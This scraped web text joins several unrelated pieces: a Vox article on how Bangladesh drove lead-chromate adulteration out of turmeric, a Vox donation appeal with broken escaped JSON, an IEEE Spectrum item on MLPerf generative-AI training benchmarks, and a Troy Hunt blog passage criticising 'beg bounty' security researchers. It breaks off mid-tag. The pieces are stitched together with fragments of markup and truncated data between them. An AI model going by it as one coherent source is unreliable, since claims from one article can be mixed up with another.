<p id="CvahXV">After a 20-year, worldwide campaign, in 2021 Algeria became the final country to <a href="https://www.vox.com/future-perfect/22650920/leaded-gasoline-eradicated-public-health">end leaded gasoline</a> in cars — something the US <a href="https://www.eia.gov/energyexplained/gasoline/history-of-gasoline.php#:~:text=Unleaded%20gasoline%20was%20introduced%20in,using%20leaded%20gasoline%20in%20vehicles.">phased out in 1996</a>. That should make a huge difference to environmental lead levels. But lots of sources remain, from car <a href="https://www.vox.com/batteries" data-source="encore">batteries</a> to ceramics.</p>
<p id="cdtGcC">This isn’t a story about all the hard work still ahead of us, though: It’s a story about solutions, about one case where scientists, advocates, and policymakers came together to make one place in the world safer from lead. </p>

<p id="2G9VpV">Bangladesh phased out leaded gasoline in the 1990s. But high blood lead levels have remained. Why? When researchers Stephen Luby and Jenny Forsyth, doing work in rural Bangladesh, tried to isolate the source, it turned out to be a surprising one: <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7705119/">lead-adulterated turmeric</a>. </p>
<p id="qEA3NC">Turmeric, a spice in common use for cooking in South Asia and beyond, is yellow, and adding a pigment made of lead chromate makes for bright, vibrant colors — and better sales. Buyers of the adulterated turmeric were <a href="https://news.stanford.edu/2019/09/24/lead-found-turmeric/#:~:text=The%20researchers%20were%20able%20to,to%20lead%20levels%20in%20blood.">slowly being poisoned</a>.</p>
<p id="7sEagu">That bad news made a lot of headlines, especially as it became clear that adulterated spices were <a href="https://www.kuow.org/stories/turmeric-poisoned-their-kids-four-seattle-area-cases-show-gaps-in-lead-testing">also poisoning kids in America</a> (usually in cases where family had brought spices from abroad). </p>
<p id="qvWQKC">But there’s also good news: <a href="https://www.sciencedirect.com/science/article/pii/S0013935123011325?via%3Dihub">A recent paper studying lead in turmeric in Bangladesh</a> found that researchers and the Bangladeshi government appear to have driven lead out of the turmeric business in Bangladesh. </p>
<h3 id="a4caCP">How Bangladesh got serious about lead poisoning</h3>
<p id="ZRuXca">Reporting from Bangladesh this summer, <a href="https://undark.org/2023/07/19/the-vice-of-spice-confronting-lead-tainted-turmeric/">Wudan Yan in Undark</a> narrates the gripping story of what happened after researchers realized that turmeric might be driving the shockingly high blood lead results they kept observing. </p>
<p id="xF4Wvt">The researchers who’d isolated turmeric as the primary cause of high blood lead levels —working for the nonprofit International Center for Diarrheal Disease Research, Bangladesh — went to meet with government officials. They collected samples nationwide and published a <a href="https://www.sciencedirect.com/science/article/pii/S0013935119305195?via%3Dihub">2019 follow-up paper</a> on the extent of the problem. Bangladesh’s Food Safety Authority got involved. </p>
<p id="3oLjoj">They settled on a two-part approach, starting with an education campaign to warn people about the dangers of lead. Once people had been warned that lead adulteration was illegal, they followed up with raids to analyze turmeric and fine sellers who were selling adulterated products. </p>
<p id="OunhL0">They posted tens of thousands of fliers informing people about the risks of lead. They got coverage in the news. And then they swept through the markets with X-ray fluorescence analyzers, which detect lead. They seized contaminated products and fined sellers. </p>
<p id="4cqePw">According to the<a href="https://www.sciencedirect.com/science/article/pii/S0013935123011325?via%3Dihub"> study released earlier this month</a>, this worked spectacularly well. “The proportion of market turmeric samples containing detectable lead decreased from 47 percent pre-intervention in 2019 to 0 percent in 2021,” the study found. And the vanishing of lead from turmeric had an immediate and dramatic effect on blood lead levels in the affected populations, too: “Blood lead levels dropped a median of 30 percent.”</p>
<p id="BuzPDq">The researchers who helped make that result happen are gearing up for similar campaigns in other areas where spices are adulterated. </p>
<h3 id="Jdkc1v">The power of problem-solving</h3>
<p id="UPfrSJ">A lot of problems in the world are deep-seated and complicated, with many stakeholders and no clear way to make progress. Trying to solve <a href="https://www.vox.com/climate" data-source="encore">climate change</a> for example, as both activists and diplomats working now during Climate Week in New York City, won’t be a matter of finding a single bullet, but pursuing an arduous multi-decade, multi-stakeholder approach.</p>
<p id="iHtjxi">But sometimes, a problem exists because there was inadequate knowledge that it even was a problem, and insufficient will to enforce existing rules that would solve it. </p>
<p id="N9vGo0">One thing I find striking about Yan’s reporting from Bangladesh is that one supplier who sold adulterated turmeric had fed it to their own children. Others knew it wasn’t safe, but felt stuck selling it. They weren’t trying to do something monstrous; they either didn’t know about it, didn’t know what to do about it, or thought they’d go out of business if they stopped using the supplement while other businesses kept using it. </p>
<p id="HA2anx">When the Food Safety Authority showed up at the market and started issuing fines for lead adulteration, it stopped being a savvy business move to add lead. Purchasers who were accustomed to unnatural lead-colored turmeric learned how to recognize non-adulterated turmeric. And so lead went from ubiquitous to nearly nonexistent in the space of just a few years. </p>
<p id="iNrTnh">That’s a better world for everyone, from turmeric wholesalers to vulnerable kids — all purchased at a shockingly low price. The paper published this month concludes, “with credible information, appropriate technology, and good enough governance, the adulteration of spices can be stopped.” </p>
<p id="NnsKss">There’s still a lot more to be done. <a href="https://www.vox.com/india" data-source="encore">India</a>, like Bangladesh, has <a href="https://www.bu.edu/articles/2017/high-lead-levels-found-in-tumeric-from-local-stores/#:~:text=International%20media%20reports%20from%20India,the%20US%20and%20other%20countries.">widespread adulteration</a> of turmeric. And safety testing will have to remain vigilant to prevent lead in Bangladesh from creeping back into the spice supply. </p>
<p id="dx309A">But for all those caveats, it’s rare to see such fast, decisive action on a major health problem — and impressive to see it immediately rewarded with such a dramatic improvement in blood lead levels and health outcomes. It’s a reminder that things can change, and can change very quickly, as long as people care, and as long as they act.</p>

But when it comes to what we’re trying to do at Vox, there are a couple reasons that we can't rely only on ads and subscriptions to keep the lights on. \r\n<br/>\r\n<br/>\r\nFirst, advertising dollars go up and down with the economy. We often only know a few months out what our advertising revenue will be, which makes it hard to plan ahead.\r\n<br/>\r\n<br/>\r\nSecond, we’re not in the subscriptions business. Vox is here to help everyone understand the complex issues shaping the world — not just the people who can afford to pay for a subscription. We believe that’s an important part of building a more equal society. We can’t do that if we have a paywall. \r\n <br/>\r\n<br/>\r\nThat’s why we also turn to you, our readers, to help us keep Vox free. <a href=\&quot;http://vox.com/pages/support-now?itm_campaign=biz-explainer&amp;itm_medium=site&amp;itm_source=article-footer\&quot;> If you also believe that everyone deserves access to trusted high-quality information, will you make a gift to Vox today?</a>&quot;,&quot;article_footer_header&quot;:&quot;<a href=\&quot;http://vox.com/pages/support-now?itm_campaign=default&amp;itm_medium=article&amp;itm_source=article-footer\&quot;>Will you support Vox’s explanatory journalism?</a>&quot;,&quot;use_article_footer&quot;:true,&quot;article_footer_cta_annual_plans&quot;:&quot;{\r\n  \&quot;default_plan\&quot;: 1,\r\n  \&quot;plans\&quot;: [\r\n    {\r\n      \&quot;amount\&quot;: 50,\r\n      \&quot;plan_id\&quot;: 99546\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 100,\r\n      \&quot;plan_id\&quot;: 99547\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 150,\r\n      \&quot;plan_id\&quot;: 99548\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 200,\r\n      \&quot;plan_id\&quot;: 99549\r\n    }\r\n  ]\r\n}&quot;,&quot;article_footer_cta_button_annual_copy&quot;:&quot;year&quot;,&quot;article_footer_cta_button_copy&quot;:&quot;Yes, I'll give&quot;,&quot;article_footer_cta_button_monthly_copy&quot;:&quot;month&quot;,&quot;article_footer_cta_default_frequency&quot;:&quot;monthly&quot;,&quot;article_footer_cta_monthly_plans&quot;:&quot;{\r\n  \&quot;default_plan\&quot;: 0,\r\n  \&quot;plans\&quot;: [\r\n    {\r\n      \&quot;amount\&quot;: 5,\r\n      \&quot;plan_id\&quot;: 99543\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 10,\r\n      \&quot;plan_id\&quot;: 99544\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 25,\r\n      \&quot;plan_id\&quot;: 99545\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 50,\r\n      \&quot;plan_id\&quot;: 46947\r\n    }\r\n  ]\r\n}&quot;,&quot;article_footer_cta_once_plans&quot;:&quot;{\r\n  \&quot;default_plan\&quot;: 0,\r\n  \&quot;plans\&quot;: [\r\n    {\r\n      \&quot;amount\&quot;: 20,\r\n      \&quot;plan_id\&quot;: 69278\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 50,\r\n      \&quot;plan_id\&quot;: 48880\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 100,\r\n      \&quot;plan_id\&quot;: 46607\r\n    },\r\n    {\r\n      \&quot;amount\&quot;: 250,\r\n      \&quot;plan_id\&quot;: 46946\r\n    }\r\n  ]\r\n}&quot;,&quot;use_article_footer_cta_read_counter&quot;:true,&quot;use_article_footer_cta&quot;:true,&quot;groups&quot;:[{&quot;base_type&quot;:&quot;EntryGroup&quot;,&quot;id&quot;:76815,&quot;timestamp&quot;:1699647747,&quot;title&quot;:&quot;Future Perfect&quot;,&quot;type&quot;:&quot;SiteGroup&quot;,&quot;url&quot;:&quot;https://www.vox.com/future-perfect&quot;,&quot;slug&quot;:&quot;future-perfect&quot;,&quot;community_logo&quot;:&quot;\r\n<svg width=\&quot;386px\&quot;

    <div><p>
      Most news outlets make their money through advertising or subscriptions. But when it comes to what we’re trying to do at Vox, there are a couple reasons that we can't rely only on ads and subscriptions to keep the lights on. 
</p><p>

First, advertising dollars go up and down with the economy. We often only know a few months out what our advertising revenue will be, which makes it hard to plan ahead.
</p><p>

Second, we’re not in the subscriptions business. Vox is here to help everyone understand the complex issues shaping the world — not just the people who can afford to pay for a subscription. We believe that’s an important part of building a more equal society. We can’t do that if we have a paywall. 
 </p><p>

That’s why we also turn to you, our readers, to help us keep Vox free. <a href="http://vox.com/pages/support-now?itm_campaign=biz-explainer&amp;itm_medium=site&amp;itm_source=article-footer"> If you also believe that everyone deserves access to trusted high-quality information, will you make a gift to Vox today?</a></p></div>

            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/generative-ai-training">https://spectrum.ieee.org/generative-ai-training</a>, See on <a href="https://news.ycombinator.com/item?id=38246032">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-elid="2666157204" data-post-url="https://spectrum.ieee.org/generative-ai-training" data-authors="Samuel K. Moore" data-headline="Google, Intel, Nvidia Battle in Generative AI Training" data-page-title="Google, Intel, Nvidia Battle in Generative AI Training - IEEE Spectrum"><p>The leading public apples-to-apples test for computer systems’ ability to train machine learning neural networks has fully entered the <a href="https://spectrum.ieee.org/tag/generative-ai" target="_blank">generative AI</a> era. Earlier this year, MLPerf <a href="https://spectrum.ieee.org/large-language-models-training-benchmark" target="_blank">added a test for training large language models</a> (LLM), <a href="https://spectrum.ieee.org/tag/gpt-3">GPT-3</a> in particular. This month it adds Stable Diffusion, a <a href="https://spectrum.ieee.org/openai-dall-e-2" target="_blank">text-to-image generator</a>. Computers powered by <a href="https://spectrum.ieee.org/tag/intel">Intel</a> and Nvidia took on the new benchmark. And the rivals continued their earlier battle in training GPT-3, where they were joined this go-around by <a href="https://spectrum.ieee.org/tag/google">Google</a>. </p><p>All three devoted  huge systems to the task—Nvidia’s 10,000 GPU supercomputer was the largest ever tested—and that size is necessary in generative AI. Even Nvidia’s largest system would have taken eight days of work to fully complete its LLM job.</p><p>Overall, 19 companies and institutions submitted more than 200  results, which showed a 2.8-fold performance boost over the past five months, and a 49-fold boost since MLPerf began five years ago.</p><h2>Nvidia, <a href="https://spectrum.ieee.org/tag/microsoft">Microsoft</a> test 10,752-GPU monsters</h2><p>Nvidia continued to dominate the MLPerf benchmarks with systems made from its H100 GPUs. But the cherry on top were results from <a href="https://nvidianews.nvidia.com/news/nvidia-announces-dgx-h100-systems-worlds-most-advanced-enterprise-ai-infrastructure" target="_blank">Eos</a>, the company’s new 10,752-GPU AI supercomputer. Bending all those GPUs<strong></strong>to the task of the GPT-3 training benchmark, Eos had the job done in just under 4 minutes. Microsoft’s cloud computing arm, Azure, tested a system of the exact same size and were behind Eos by mere seconds. (Azure powers GitHub’s coding assistant <a href="https://spectrum.ieee.org/ai-software" target="_blank">CoPilot</a> and OpenAI’s <a href="https://spectrum.ieee.org/tag/chatgpt" target="_blank">ChatGPT</a>.)</p><p>Eos’s GPUs are capable of an aggregate 42.6 billion billion floating point operations per second (exaflops). And they are bound together with interconnects—Nvidia’s Quantum-2 Infiniband—that sling 1.1 million billion bytes per second. “Some of these speeds and feeds are mind-blowing,” says Dave Salvatore, Nvidia’s director of AI benchmarking and cloud computing. “This is an incredibly capable machine.”</p><p>Eos triples the number of H100 GPUs that have been bound into a single machine. That three-fold increase purchased a 2.8-fold performance improvement, or 93 percent scaling efficiency. Efficient scaling is key to continued improvement of generative AI, which have been <a href="https://blogs.nvidia.com/blog/2023/09/29/huangs-law-dally-hot-chips/" target="_blank">growing 10-fold every year</a>. </p><p>The GPT-3 benchmark Eos tackled is not a complete training of GPT-3, because MLPerf wanted it to be within reach of many companies. Instead, it involves training the system to a certain checkpoint that proves the training would have reached the needed accuracy given enough time. And these trainings do take time. Extrapolating from Eos’s 4 minutes means it would take 8 days to complete the training, and that’s on what might be the most powerful AI supercomputer yet built. A more reasonably-sized computer—512 H100s—would take 4 months.</p><h2>Intel continues to close in</h2><p>Intel submitted results for systems using the <a href="https://habana.ai/wp-content/uploads/2023/10/Intel-Gaudi2-AI-Accelerators-whitepaper.pdf" target="_blank">Gaudi 2</a> accelerator chip and for those that had no accelerator at all, relying only its 4th generation Xeon CPU. The big change from the last set of training benchmarks was that the company had enabled Gaudi 2’s 8-bit floating point (FP8) capabilities. The use of lower precision numbers, such as FP8, has been responsible for <a href="https://spectrum.ieee.org/nvidia-gpu" target="_blank">most of the improvement in GPU performance in last 10 years</a>. The use of FP8 in parts of GPT-3 and other transformer neural networks where their low precision won’t affect accuracy has already showed its value in Nvidia’s H100 results. Now Gaudi 2 is seeing the boost.</p><p>“We projected a 90 percent gain” from switching on FP8, says <a href="https://www.linkedin.com/in/eitan-medina-7147964/?originalSubdomain=il" target="_blank">Eitan Medina</a>, chief operating officer at Intel’s Habana Labs. “We delivered more than what was promised—a 103 percent reduction in time-to-train for a 384-accelerator cluster.”</p><p>That new result puts the Gaudi 2 system a little less than one-third the speed of an Nvidia system on a per-chip basis and three times faster than Google’s TPUv5e. On the new image generation benchmark, Gaudi 2 was also about half the H100’s speed. GPT-3 was the only benchmark FP8 was enabled for this round, but Medina says his team is working on switching it on for others now.<span></span></p><p>Medina continued to make the case that Gaudi 2 has a significantly lower price to the H100, and so it has an advantage on a combined metric of price and performance. Medina expects the advantage will grow with the next generation of Intel accelerator chip, Gaudi 3. That chip will be in volume production in 2024 and will be built using the same semiconductor manufacturing process as the Nvidia H100.</p><p>Separately, Intel submitted results for systems based only on CPUs. Again, showing training times of between minutes and hours for several benchmarks. Beyond the MLPerf benchmarks, Intel also shared some data showing that a 4-node Xeon system, whose chips include the AMX matrix engine can fine tune the image generator stable diffusion in less than five minutes. Fine tuning takes an already-trained neural network and specializes it toward a certain task. For example, <a href="https://spectrum.ieee.org/ai-for-engineering" target="_blank">Nvidia’s chip design AI</a> is a fine-tuning of an existing large language model called NeMo.</p><p>You can see all the results <a href="https://mlcommons.org/benchmarks/inference-datacenter/" target="_blank">here</a>.</p></div></div>]]></description>

<p><a href="https://www.troyhunt.com/data-from-connected-cloudpets-teddy-bears-leaked-and-ransomed-exposing-kids-voice-messages/">When someone passed me hundreds of thousands of records on kids taken from CloudPets a few years ago</a>, I had a nightmare of a time getting in touch with the company. They'd left a MongoDB instance exposed to the public without a password and someone had snagged all their data. Within the data were references that granted access to voice recordings made by children, stored in an S3 bucket that also had no auth. So, why didn't CloudPets respond to attempts to contact them? Their CEO later explained it very succinctly:</p><blockquote data-conversation="none"><p lang="en" dir="ltr">"We did have a reporter, try to contact us multiple times last week, you don't respond to some random person about a data breach.</p>— Michael Kan (@Michael_Kan) <a href="https://twitter.com/Michael_Kan/status/836593923304767488?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">February 28, 2017</a></blockquote> <p>Problem is, random people are <em>precisely</em> the sorts of people that find data breaches. I mean, who <em>wouldn't </em>be random in this situation?!</p><p>A little later and I'm attempting disclosure to Adult-FanFiction:</p><figure><img src="https://www.troyhunt.com/content/images/2021/11/Picture1.png" alt="" loading="lazy" width="918" height="720" srcset="https://www.troyhunt.com/content/images/size/w600/2021/11/Picture1.png 600w, https://www.troyhunt.com/content/images/2021/11/Picture1.png 918w"></figure><p>I always try to provide enough information to independently verify the incident thus making it easy to establish the legitimacy of my message. I'd done this so many times by then that I was <em>very </em>conscious of how scammy these messages can look. Alas, all reasonable measures were exhausted without response, I loaded the data into <a href="https://haveibeenpwned.com/?ref=troyhunt.com">Have I Been Pwned</a> (HIBP) and <em>then </em>they took notice:</p><figure><img src="https://www.troyhunt.com/content/images/2021/11/Adult-FanFiction.png" alt="" loading="lazy" width="1306" height="716" srcset="https://www.troyhunt.com/content/images/size/w600/2021/11/Adult-FanFiction.png 600w, https://www.troyhunt.com/content/images/size/w1000/2021/11/Adult-FanFiction.png 1000w, https://www.troyhunt.com/content/images/2021/11/Adult-FanFiction.png 1306w"></figure><p>In order of sentences: Yes there is, that's bullshit, that's true, that's also bullshit, no they won't, they never did. That public forum post was later removed, but I always back these things up because you just never know when common sense may prevail 🙂</p><p>Why are companies so skittish about responding to disclosure notices like these? In part, because there are those amongst us who attempt to run what amounts to a digital <a href="https://en.wikipedia.org/wiki/Protection_racket?ref=troyhunt.com">protection racket</a> in order to make some quick bucks. Here's an example:</p><figure><img src="https://www.troyhunt.com/content/images/2021/11/image.png" alt="" loading="lazy" width="1010" height="1579" srcset="https://www.troyhunt.com/content/images/size/w600/2021/11/image.png 600w, https://www.troyhunt.com/content/images/size/w1000/2021/11/image.png 1000w, https://www.troyhunt.com/content/images/2021/11/image.png 1010w"></figure><p>Ooh, sounds nasty!

And that's a real possibility; I've created dozens of courses on infosec (<a href="https://www.pluralsight.com/courses/hack-yourself-first?ref=troyhunt.com">including one that includes a module on clickjacking!</a>), I've written hundreds of blog posts on the topic, I've travelled the world running <a href="https://www.troyhunt.com/workshops/">my Hack Yourself First workshop</a> (over 100 times now), I've somehow <a href="https://www.troyhunt.com/heres-what-im-telling-us-congress-about-data-breaches/">even ended up in US Congress talking about cybersecurity</a>!

I love bug bounties (<a href="https://www.pluralsight.com/courses/play-by-play-bug-bounties-researchers?ref=troyhunt.com">2 of my Pluralsight courses are on them with friend and Bugcrowd founder Casey Ellis</a>), but we're not talking about organisations with the resources to invest in formal programs that pay money (which, incidentally, <a href="https://www.pluralsight.com/tech-blog/pluralsights-security-bounty-program/?ref=troyhunt.com">Pluralsight also runs</a>). No, we're talking about resources like my blog and free community projects like HIBP. Hence the "beg" component of the bounty.</p>

It's dead simple, you just use tools like <a href="https://www.ssllabs.com/ssltest/analyze.html?d=haveibeenpwned.com&amp;s=2606%3A4700%3A0%3A0%3A0%3A0%3A6812%3Aad0d&amp;latest=&amp;ref=troyhunt.com">Qualys' SSL Labs</a>, <a href="https://dmarcian.com/dmarc-inspector/?domain=haveibeenpwned.com&amp;ref=troyhunt.com">dmarcian</a> or <a href="https://securityheaders.com/?q=https%3A%2F%2Fhaveibeenpwned.com%2F&amp;followRedirects=on&amp;ref=troyhunt.com">Scott Helme's Security Headers</a>, among others. Easy point and shoot magic and you don't need to have any idea whatsoever what you're doing! But hold on, why does that HIBP report on Scott's site only score a "B"? Where's the CSP? And the referrer-policy? They're on HIBP (go and check for yourself in your browser), but they're not there on the interstitial page Cloudflare is serving up to Scott's crawler as part of the anti-automation defences I've put in place. But hey, that takes knowledge and understanding to establish which is why I've received beg bounty requests for precisely this in the past.</p><p>I was finally prompted to write this after yet another run-in with someone seeking a beg bounty. Here's the thread:</p><figure><blockquote><p lang="en" dir="ltr">I fucking hate beg bounties 😡 <a href="https://t.co/Giv4JRRaty?ref=troyhunt.com">pic.twitter.com/Giv4JRRaty</a></p>— Troy Hunt (@troyhunt) <a href="https://twitter.com/troyhunt/status/1456944042353172487?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote>

</figure><p>It was <em>immediately</em> clear that Hammad was going to beg for a bounty, but it was a quiet Saturday night here and I thought it would be entertaining to see just how far down the rabbit hole he wanted to go. So, I responded, positively:</p><blockquote data-conversation="none"><p lang="und" dir="ltr"><a href="https://t.co/1OEkJDHHcH?ref=troyhunt.com">pic.twitter.com/1OEkJDHHcH</a></p>— Troy Hunt (@troyhunt) <a href="https://twitter.com/troyhunt/status/1456944048527183878?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>I took my usual signature off the email (the one you can see in an earlier screen grab), just to ensure Hammad held onto the glimmer of hope that he may successfully extract some hard-earned money from me. Of course, he took the bait:</p><blockquote data-conversation="none"><p lang="und" dir="ltr"><a href="https://t.co/epM9YTSz1L?ref=troyhunt.com">pic.twitter.com/epM9YTSz1L</a></p>— Troy Hunt (@troyhunt) <a href="https://twitter.com/troyhunt/status/1456944054269214720?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>It's like dealing with scam phone calls: if you want to see where they lead, you need to play the game and not come on too strong too early. Hammad continued a few minutes later:</p><blockquote data-conversation="none"><p lang="und" dir="ltr"><a href="https://t.co/uoaGstoASH?ref=troyhunt.com">pic.twitter.com/uoaGstoASH</a></p>— Troy Hunt (@troyhunt) <a href="https://twitter.com/troyhunt/status/1456944060296413189?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>And there we have it. The beg. It was always going to come, he just neglected to mention it in the first message. Maybe he forgot? Or maybe he's done this enough times now (which subsequent replies to this thread with his previous attempts suggest) that he's learned enough social engineering to know not to go too hard on the first approach. This dismayed me:</p><blockquote data-conversation="none"><p lang="und" dir="ltr"><a href="https://t.co/yfVR8UkXBv?ref=troyhunt.com">pic.twitter.com/yfVR8UkXBv</a></p>— Troy Hunt (@troyhunt) <a href="https://twitter.com/troyhunt/status/1456944066143272965?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>On a (slightly) more serious note for a moment, this is what specifically pisses me off: I don't know how many disclosures I've done of both serious security vulnerabilities and complete breaches of data (100+, surely), but I have never, ever - <em>not even once</em> - asked for money. But Hammad isn't me:</p><blockquote data-conversation="none"><p lang="und" dir="ltr"><a href="https://t.co/hhBpyBQG6y?ref=troyhunt.com">pic.twitter.com/hhBpyBQG6y</a></p>— Troy Hunt (@troyhunt) <a href="https://twitter.com/troyhunt/status/1456944072791248900?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>Now, as many people subsequently pointed out in the thread, the irony is that Hammad <em>did </em>actually already do the "work" for free and whether I paid him or not, the effort had already been invested. Ok, patience exhausted, time to put the signature back in and take Hammad to school:</p><blockquote data-conversation="none"><p lang="und" dir="ltr"><a href="https://t.co/We6F17ZOZY?ref=troyhunt.com">pic.twitter.com/We6F17ZOZY</a></p>— Troy Hunt (@troyhunt) <a href="https://twitter.com/troyhunt/status/1456944080936599557?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>I did genuinely have this blog post in draft and had been adding bits to it as the Hammads of the world popped their begs into my inbox. If he stopped responding here, then that would have been the end of it; I might have just added a couple more notes and come back to this post in the distant future. However, after this next reply I knew where my Sunday afternoon was going:</p><blockquote data-conversation="none"><p lang="und" dir="ltr"><a href="https://t.co/1KtYck2WEF?ref=troyhunt.com">pic.twitter.com/1KtYck2WEF</a></p>— Troy Hunt (@troyhunt) <a href="https://twitter.com/troyhunt/status/1456947217839714311?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>I bet it was clickjacking! Maybe on <a href="https://hack-yourself-first.com/?ref=troyhunt.com">hack-yourself-first.com</a> 🤣</p><p>Clearly, I didn't forget and I also didn't forgive and he probably should have expected me (sorry, couldn't help myself!) If I'm honest, I was surprised at how much traction this thread got and I woke up on Sunday morning to hundreds of mentions and thousands of likes across the tweet thread. It struck a chord. <em>Many </em>of you fucking hate beg bounties and shared my lack of sympathy for Muhammad Kamran (the full name will help SEO the next time someone he targets starts searching for him 🙂). However, there was a very small single-digit number of people that disagreed, and I want to address those arguments here:</p><blockquote data-conversation="none"><p lang="en" dir="ltr">I'm not happy with this approach either. If he is a scammer with no vuln found then go ahead and waste his time. I wouldn't call people trying to make money as a begger. He sounds kind and sincere to me. I don't public humiliate a person asking to wash my windows for a dollar</p>— JohnΞ (@j3g) <a href="https://twitter.com/j3g/status/1457094782736470017?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>First sentence - good! Onto the "scammer" comment and it raises an interesting question: is this a scam? I agree with this use of the term in that this behaviour amounts to "a dishonest scheme" and, depending on the definition you read, the intent is to "deceive and defraud". Attempting to scare people with an alleged vulnerability then withholding information about it until a financial commitment is made all whilst claiming to be a "white hat" is dishonest, deceptive, and fraudulent. As for the rest, firstly, "beg bounty" is becoming a pretty broadly adopted term as you saw from the Sophos article. A quick nod also to Michael Argast and Chester Wisniewski (who, incidentally, wrote the earlier mentioned Sophos article) for their role in coining the phrase:</p><blockquote><p lang="en" dir="ltr">I love the fact a term I coined with <a href="https://twitter.com/chetwisniewski?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">@chetwisniewski</a> after running into a bunch of these a couple of years ago is getting tweeted by <a href="https://twitter.com/troyhunt?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">@troyhunt</a>, one of my infosec heros. 😆 <a href="https://t.co/heOQjWgySz?ref=troyhunt.com">https://t.co/heOQjWgySz</a></p>— Michael Argast 💉💉🤗 (@michaelargast) <a href="https://twitter.com/michaelargast/status/1456994041279639554?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>As for Hammad having a "kind and sincere" demeanour, <a href="https://learningenglish.voanews.com/a/get-what-you-want-with-honey-/5755865.html?ref=troyhunt.com">you get more flies with honey than vinegar</a>. <em>Of course he's going to be nice!</em> Have you ever had someone try to scam you who started out being obnoxious? No, you'd hang up on them right away. Gaining someone's trust by coming across as approachable and building rapport is scamming 101. It's also no excuse whatsoever for this behaviour. As for the "wash my windows for a dollar" remark, firstly, <a href="https://www.troyhunt.com/irl-analogies-to-explain-digital-concepts-are-terrible/">IRL analogies explaining digital concepts are terrible</a>. Secondly, if we really want to go down that path then the correct analogy is a random stranger telling you there's something important wrong with your car, but they won't tell you what it is unless you give them money. A lot less nice, that example, isn't it?</p><blockquote data-conversation="none"><p lang="en" dir="ltr">sorry Troy, but I don't think that your answers were appropriate. While these people obviously want some free money, you don't need to lower yourself to that level, you could have handled it better.

Look, if you really want to inject some warm fuzzies into your own messaging then suggest the likes of Hammad go and get involved as a genuine security researcher at <a href="https://www.bugcrowd.com/?ref=troyhunt.com">Bugcrowd</a> or <a href="https://www.hackerone.com/?ref=troyhunt.com">HackerOne</a>. There has never been a better time for <em>actual </em>security researchers to get involved in this industry and there is no shortage of opportunities that don't involve shaking down unsuspecting victims for cash. And people <em>have </em>been actively sharing their own experiences with the same guy:</p><blockquote><p lang="en" dir="ltr">One must simply love these "White Hat Hackers"... <a href="https://t.co/xfxgVuuX4t?ref=troyhunt.com">pic.twitter.com/xfxgVuuX4t</a></p>— Ondřej Surý (@oerdnj) <a href="https://twitter.com/oerdnj/status/1455820710492975106?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 3, 2021</a></blockquote> <blockquote data-conversation="none"><p lang="en" dir="ltr">That name is familiar… I found this back in 2019 <a href="https://t.co/7rxcZl0Tms?ref=troyhunt.com">pic.twitter.com/7rxcZl0Tms</a></p>— Parrilla (@nubeblog) <a href="https://twitter.com/nubeblog/status/1457084154219221004?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <blockquote data-conversation="none"><p lang="en" dir="ltr">muhammad hammad loves <a href="https://twitter.com/elhackernet?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">@elhackernet</a> too 😂 <a href="https://t.co/JJ9q9uqUTu?ref=troyhunt.com">pic.twitter.com/JJ9q9uqUTu</a></p>— elhacker.NET (@elhackernet) <a href="https://twitter.com/elhackernet/status/1457459693262184450?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 7, 2021</a></blockquote> <blockquote data-conversation="none"><p lang="en" dir="ltr">Yea he has been floating around begging for a while. <a href="https://t.co/yRAuUQMvQ6?ref=troyhunt.com">pic.twitter.com/yRAuUQMvQ6</a></p>— (╯°□°）╯︵ zɔɹʎp ʎpuɐ (@adyrcz) <a href="https://twitter.com/adyrcz/status/1457035316552998912?ref_src=twsrc%5Etfw&amp;ref=troyhunt.com">November 6, 2021</a></blockquote> <p>This illustrates why on balance, I'm comfortable using the name Muhammad Kamran or Muhammad Hammad in this post as others have done in their tweets; I'd like for the next person he tries to scare into coughing up cash to search for his name, find this post and understand the principle of the beg bounty and why it can be safely ignored. Equally, I'd be perfectly happy if someone used my name to highlight my approach to disclosure, because this is what it looks like:</p><figure><img src="https://www.troyhunt.com/content/images/2021/11/image-3.png" alt="" loading="lazy" width="854" height="510" srcset="https://www.troyhunt.com/content/images/size/w600/2021/11/image-3.png 600w, https://www.troyhunt.com/content/images/2021/11/image-3.png 854w"></figure><p>I picked this example because it's very recent and if you read <a href="https://twitter.com/troyhunt/status/1448593628096458756?ref=troyhunt.com">my tweet thread about the Thingiverse breach</a>, a very frustrating experience. <em>But it's the right way to go about it!</em> Open. Honest. Transparent. But above all, bereft of ulterior motives. I only wanted one thing out of the Thingiverse disclosure and that was simply for them to be aware of the breach and to inform their customers accordingly.</p><p>Getting back to my original point, is it any wonder companies are standoff-ish when someone like myself attempts to report a genuine <em>serious </em>security issue? Just look at <a 